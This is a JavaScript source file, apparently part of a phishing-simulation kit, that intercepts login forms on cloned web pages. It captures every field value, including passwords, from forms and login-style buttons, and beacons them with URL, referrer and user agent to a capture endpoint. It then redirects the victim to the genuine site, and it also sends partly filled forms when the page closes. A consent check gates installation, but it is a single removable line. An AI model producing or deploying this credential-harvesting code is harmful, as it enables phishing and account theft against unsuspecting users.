/**
 * credentials.js — form-submit interceptor for cloned pages.
 *
 *  - Hooks every <form> on the page (and any added later via JS).
 *  - On submit, captures all input/textarea/select values into a JSON
 *    object and POSTs it to /api/capture.php?slug=<slug>&kind=cred.
 *  - Then redirects the visitor to the original URL so the page they
 *    "tried to log in to" works as expected — in a walkthrough afterward,
 *    the trainee can be shown exactly which field values reached the panel.
 *
 *  - Survives early submits via navigator.sendBeacon (fetch+keepalive
 *    fallback when sendBeacon isn't available).
 *  - Also hooks bare login-style buttons that aren't inside a <form>.
 *  - Uses MutationObserver so forms inserted by JS later are still hooked.
 *
 * Gated: the hooks are installed only after the consent notice has been
 * accepted. Until then this module registers and waits — before consent
 * no listener is attached, so a submit does nothing and nothing is sent.
 * With no gate present it stays inert.
 *
 * Globals it expects (set by the cloner bootstrap):
 *   window.__SB_TARGET        — slug of this clone
 *   window.__SB_ORIGINAL_URL  — URL to redirect to after capture
 *   window.__SB_CONSENT       — the consent gate (see consent.js)
 */
(function () {
  'use strict';

  var slug      = window.__SB_TARGET || '';
  var origUrl   = window.__SB_ORIGINAL_URL || '';
  if (!slug) return;

  // Built via __SB_API so a <base href> on the page can't redirect us.
  var apiUrl = window.__SB_API ? window.__SB_API('cred')
                               : (location.origin + '/api/capture.php?slug=' + encodeURIComponent(slug) + '&kind=cred');
  var sent   = false;   // dedupe — a form submit + click can fire both

  /* Build a plain object of every form-like field on the page. */
  function snapshotInputs(scope) {
    var data = {};
    var nodes = (scope || document).querySelectorAll('input, textarea, select');
    for (var i = 0; i < nodes.length; i++) {
      var el = nodes[i];
      var t  = (el.type || '').toLowerCase();

      // Skip noise.
      if (t === 'submit' || t === 'button' || t === 'reset' || t === 'image' || t === 'file') continue;
      if (t === 'checkbox' || t === 'radio') {
        if (!el.checked) continue;
      }

      var key = el.name || el.id || el.placeholder || ('field_' + i);
      // Don't clobber the same key — array-ify if it repeats.
      if (key in data) {
        if (!Array.isArray(data[key])) data[key] = [data[key]];
        data[key].push(el.value);
      } else {
        data[key] = el.value;
      }
    }
    return data;
  }

  function send(payload) {
    if (sent) return;
    sent = true;

    payload._url       = location.href;
    payload._referrer  = document.referrer || '';
    payload._ua        = navigator.userAgent;
    payload._ts        = new Date().toISOString();

    var json = JSON.stringify(payload);
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(apiUrl, new Blob([json], { type: 'application/json' }));
        return;
      }
    } catch (_) { /* fall through */ }

    try {
      fetch(apiUrl, {
        method:    'POST',
        headers:   { 'Content-Type': 'application/json' },
        body:      json,
        keepalive: true,
        mode:      'same-origin',
        credentials: 'omit',
      }).catch(function () {});
    } catch (_) { /* swallow */ }
  }

  function leave() {
    if (origUrl) {
      try { location.replace(origUrl); return; } catch (_) {}
    }
    // Best-effort: stay where we are and just clear inputs.
  }

  /* ── form submission ───────────────────────────────────────────── */

  function onFormSubmit(e) {
    var form = e.currentTarget;
    e.preventDefault();
    e.stopPropagation();
    send(snapshotInputs(form));
    setTimeout(leave, 250);   // give the beacon a beat to leave the tab
  }

  function hookForm(form) {
    if (form.__sb_hooked) return;
    form.__sb_hooked = true;
    form.addEventListener('submit', onFormSubmit, true);
  }

  function hookAllForms() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) hookForm(forms[i]);
  }

  /* ── bare button (no <form>) ──────────────────────────────────── */

  // Some SPAs render a button outside a real form. Heuristic: catch
  // clicks on buttons whose text matches common login labels.
  var LOGIN_RE = /\b(log[\s-]*in|sign[\s-]*in|sign[\s-]*on|login|submit|continue|next)\b|ورود|ادامه|تایید|دخول|تسجيل/i;

  function onBareClick(e) {
    var btn = e.target.closest && e.target.closest('button, [role="button"], input[type="button"], input[type="submit"]');
    if (!btn) return;
    if (btn.type === 'reset') return;
    if (btn.closest('form')) return;     // form path will handle it

    var label = (btn.value || btn.innerText || btn.textContent || '').trim();
    if (!LOGIN_RE.test(label)) return;

    e.preventDefault();
    e.stopPropagation();
    send(snapshotInputs(document));
    setTimeout(leave, 250);
  }

  /* ── boot ─────────────────────────────────────────────────────── */

  function init() {
    hookAllForms();
    document.addEventListener('click', onBareClick, true);

    if (window.MutationObserver) {
      // Coalesce bursts of DOM mutations into a single hook pass per frame.
      // A busy SPA can fire hundreds of mutations in a tick; re-scanning every
      // <form> on each one was pure waste (hookForm already skips what's hooked).
      var scheduled = false;
      function scheduleHook() {
        if (scheduled) return;
        scheduled = true;
        var run = function () { scheduled = false; hookAllForms(); };
        (window.requestAnimationFrame || window.setTimeout)(run, 0);
      }
      new MutationObserver(scheduleHook).observe(
        document.documentElement,
        { childList: true, subtree: true }
      );
    }

    // sendBeacon survives navigation, but pagehide is a useful belt-and-
    // braces in case the page is closing for some other reason after a
    // partial fill (e.g. attacker tab closed manually during demo).
    window.addEventListener('pagehide', function () {
      if (!sent) {
        var snap = snapshotInputs(document);
        // Only send if there's anything worth recording.
        for (var k in snap) {
          if (Object.prototype.hasOwnProperty.call(snap, k) && String(snap[k]).length) {
            send(snap);
            return;
          }
        }
      }
    });
  }

  function boot() {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', init);
    } else {
      init();
    }
  }

  // Fail-closed: no consent controller means no capture.
  if (!window.__SB_CONSENT) return;
  window.__SB_CONSENT.register('credentials', boot);
})();
